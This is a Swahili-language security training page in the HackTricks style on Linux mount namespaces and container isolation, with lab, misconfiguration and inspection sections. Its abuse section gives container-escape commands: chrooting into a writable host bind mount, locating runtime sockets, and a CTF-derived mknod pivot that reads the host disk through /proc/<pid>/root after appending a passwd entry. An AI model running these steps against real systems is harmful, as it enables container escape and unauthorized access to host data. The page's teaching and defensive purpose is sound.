# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Muhtasari

Mount namespace hudhibiti **mount table** ambayo process huiona. Hii ni mojawapo ya vipengele muhimu zaidi vya container isolation kwa sababu root filesystem, bind mounts, tmpfs mounts, mwonekano wa procfs, mwonekano wa sysfs, na helper mounts nyingi maalum za runtime huwakilishwa kupitia mount table hiyo. Processes mbili zinaweza kufikia `/`, `/proc`, `/sys`, au `/tmp`, lakini paths hizo zinaelekeza kwenye vitu gani hutegemea mount namespace zilizo ndani yake.

Kwa mtazamo wa container-security, mount namespace mara nyingi ndiyo tofauti kati ya "hii ni application filesystem iliyotayarishwa vizuri" na "process hii inaweza kuona au kuathiri moja kwa moja host filesystem". Ndiyo sababu bind mounts, `hostPath` volumes, privileged mount operations, na exposures za writable `/proc` au `/sys` zote zinahusiana na namespace hii.

## Uendeshaji

Runtime inapozindua container, kwa kawaida huunda mount namespace mpya, hutayarisha root filesystem ya container, hu-mount procfs na helper filesystems nyingine inapohitajika, kisha kwa hiari huongeza bind mounts, tmpfs mounts, secrets, config maps, au host paths. Baada ya process hiyo kuanza kufanya kazi ndani ya namespace, seti ya mounts inayoiona huwa kwa kiasi kikubwa imetenganishwa na mwonekano chaguo-msingi wa host. Host bado inaweza kuona filesystem halisi iliyo chini yake, lakini container huona toleo lililokusanywa kwa ajili yake na runtime.

Hii ina nguvu kwa sababu inairuhusu container kuamini kwamba ina root filesystem yake yenyewe, ingawa host bado inasimamia kila kitu. Pia ni hatari kwa sababu runtime ikifichua mount isiyofaa, process hupata ghafla uwezo wa kuona host resources ambazo security model iliyobaki huenda haikuundwa kuzilinda.

## Lab

Unaweza kuunda private mount namespace kwa kutumia:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Ukifungua shell nyingine nje ya namespace hiyo na kukagua mount table, utaona kwamba mount ya tmpfs ipo tu ndani ya mount namespace iliyotengwa. Hili ni zoezi muhimu kwa sababu linaonyesha kwamba mount isolation si nadharia isiyo na uhalisia; kernel inawasilisha mount table tofauti kabisa kwa mchakato.

Ukifungua shell nyingine nje ya namespace hiyo na kukagua mount table, mount ya tmpfs itakuwepo tu ndani ya mount namespace iliyotengwa.

Ndani ya containers, ulinganisho wa haraka ni:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Mfano wa pili unaonyesha jinsi ilivyo rahisi kwa runtime configuration kutoboa kwa kiwango kikubwa boundary ya filesystem.

## Matumizi ya Runtime

Docker, Podman, stacks zinazotegemea containerd, na CRI-O zote hutegemea private mount namespace kwa container za kawaida. Kubernetes hujenga juu ya mechanism hiyo hiyo kwa volumes, projected secrets, config maps, na `hostPath` mounts. Mazingira ya Incus/LXC pia hutegemea kwa kiasi kikubwa mount namespaces, hasa kwa sababu system containers mara nyingi hufichua filesystems zilizo pana na zinazofanana zaidi na mashine kuliko application containers.

Hii inamaanisha kwamba unapokagua tatizo la container filesystem, kwa kawaida hauangalii Docker quirk iliyojitenga. Unaangalia tatizo la mount-namespace na runtime-configuration lililoonyeshwa kupitia platform yoyote iliyozindua workload hiyo.

## Mipangilio Isiyo Sahihi

Kosa lililo wazi zaidi na hatari zaidi ni kufichua host root filesystem au host path nyingine nyeti kupitia bind mount, kwa mfano `-v /:/host` au `hostPath` inayoweza kuandikwa katika Kubernetes. Kufikia hapo, swali si tena "container inaweza escape kwa namna fulani?" bali ni "ni kiasi gani cha host content yenye manufaa ambacho tayari kinaonekana na kinaweza kuandikwa moja kwa moja?" Writable host bind mount mara nyingi hubadilisha sehemu iliyobaki ya exploit kuwa suala rahisi la kuweka files, kufanya chroot, kurekebisha config, au kugundua runtime socket.

Tatizo lingine la kawaida ni kufichua host `/proc` au `/sys` kwa njia zinazopita container view iliyo salama zaidi. Filesystems hizi si data mounts za kawaida; ni interfaces zinazoingia kwenye kernel na process state. Ikiwa workload inafikia matoleo ya host moja kwa moja, dhana nyingi zinazoipa nguvu container hardening huacha kutumika kwa usahihi.

Read-only protections pia ni muhimu. Read-only root filesystem haiifanyi container kuwa salama kimiujiza, lakini huondoa sehemu kubwa ya attacker staging space na hufanya persistence, kuweka helper-binary, na config tampering kuwa vigumu zaidi. Kinyume chake, writable root au writable host bind mount humpa attacker nafasi ya kuandaa hatua inayofuata.

## Matumizi Mabaya

Mount namespace inapotumiwa vibaya, attackers kwa kawaida hufanya mojawapo ya mambo manne. **Husoma host data** ambayo ilipaswa kubaki nje ya container. **Hubadilisha host configuration** kupitia writable bind mounts. **Hu-mount au hu-remount additional resources** ikiwa capabilities na seccomp zinaruhusu. Au **hufikia powerful sockets na runtime state directories** zinazowawezesha kuomba access zaidi kutoka kwa container platform yenyewe.

Ikiwa container inaweza tayari kuona host filesystem, security model iliyobaki hubadilika mara moja.

Unaposhuku host bind mount, kwanza thibitisha ni nini kinapatikana na ikiwa kinaweza kuandikwa:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Ikiwa root filesystem ya host imewekwa kwa ruhusa za kusoma na kuandika, direct host access mara nyingi huwa rahisi kama:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Ikiwa lengo ni privileged runtime access badala ya chrooting ya moja kwa moja, orodhesha sockets na hali ya runtime:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Ikiwa `CAP_SYS_ADMIN` ipo, pia jaribu kama mounts mpya zinaweza kuundwa kutoka ndani ya container:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Mfano Kamili: Two-Shell `mknod` Pivot

Njia maalum zaidi ya abuse hujitokeza wakati root user wa container anaweza kuunda block devices, host na container wanashiriki user identity kwa njia yenye manufaa, na attacker tayari ana low-privilege foothold kwenye host. Katika hali hiyo, container inaweza kuunda device node kama vile `/dev/sda`, na low-privilege host user anaweza kuisoma baadaye kupitia `/proc/<pid>/root/` kwa container process inayolingana.

Ndani ya container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Kutoka kwenye host, ukiwa mtumiaji husika mwenye privileges za chini baada ya kubaini PID ya shell ya container:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Somo muhimu si utafutaji halisi wa string ya CTF. Jambo ni kwamba mount-namespace exposure kupitia `/proc/<pid>/root/` inaweza kumruhusu mtumiaji wa host kutumia tena device nodes zilizoundwa na container, hata wakati cgroup device policy ilizuia matumizi ya moja kwa moja ndani ya container yenyewe.

## Ukaguzi

Amri hizi zipo ili kukuonyesha mwonekano wa filesystem ambao process ya sasa inaishi ndani yake. Lengo ni kubaini mounts zinazotokana na host, paths nyeti zinazoweza kuandikwa, na chochote kinachoonekana kuwa kipana zaidi kuliko root filesystem ya kawaida ya application container.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Ni nini kinachovutia hapa:

- Bind mounts kutoka kwa host, hasa `/`, `/proc`, `/sys`, directories za runtime state, au maeneo ya socket, zinapaswa kuonekana mara moja.
- Mounts zisizotarajiwa za read-write kwa kawaida ni muhimu zaidi kuliko idadi kubwa ya mounts za read-only za helper.
- `mountinfo` mara nyingi ndiyo sehemu bora ya kuona ikiwa path imetokana kweli na host au imeungwa mkono na overlay.

Ukaguzi huu unaonyesha **ni resources zipi zinaonekana katika namespace hii**, **ni zipi zimetokana na host**, na **ni zipi zinaweza kuandikwa au ni nyeti kwa usalama**.
{{#include ../../../../../banners/hacktricks-training.md}}
